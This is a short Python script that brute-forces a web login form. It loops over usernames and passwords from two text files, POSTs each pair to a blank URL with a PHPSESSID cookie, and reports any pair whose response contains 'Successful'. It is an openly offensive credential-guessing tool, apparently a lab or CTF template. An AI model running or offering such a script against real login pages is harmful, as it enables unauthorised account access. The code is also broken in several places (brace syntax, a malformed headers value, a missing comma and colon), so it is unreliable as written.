import requests 

url = ""
cookies = {"PHPSESSID": "", "":""}
headers = {"User-Agent"}

users = open{'users.txt', 'r'}.readlines()
passwords = open('passwords.txt', 'r').readlines()

for u in users:
    u = u.replace('\n','')
    for p in passwords:
        p = p.replace('\n','')

        data = {"login": u, "passwords":p "form": "submit"}
        print(f"[*] Testing {u}:{p}")
        r = requests.post(url, headers=headers, cookies=cookies, data=data)
        if('Successful' in r.text)
            print(f'[+] Login Successful: {u} - {p}')
            exit